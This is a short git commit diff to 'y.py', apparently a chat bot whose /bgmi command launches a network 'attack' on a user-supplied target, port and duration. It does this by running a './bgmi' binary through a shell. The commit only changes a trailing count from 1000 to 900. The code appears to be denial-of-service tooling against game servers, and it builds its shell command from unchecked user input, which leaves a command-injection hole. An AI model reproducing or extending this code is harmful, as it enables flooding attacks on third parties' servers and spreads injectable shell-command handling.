2695fccf5afcc0526306311e769bf8e8f63824aa
yogbe-3 <yogbe-3@outlook.com>
2025-01-13 09:09:01 +0530

    Update y.py

--- y.py
+++ y.py
@@ -238,7 +238,7 @@ def handle_bgmi(message):
                 record_command_logs(user_id, '/bgmi', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
-                full_command = f"./bgmi {target} {port} {time} 1000"
+                full_command = f"./bgmi {target} {port} {time} 900"
                 subprocess.run(full_command, shell=True)
                 response = f"BGMI Attack Finished. Target: {target} Port: {port} Port: {time}"
         else:
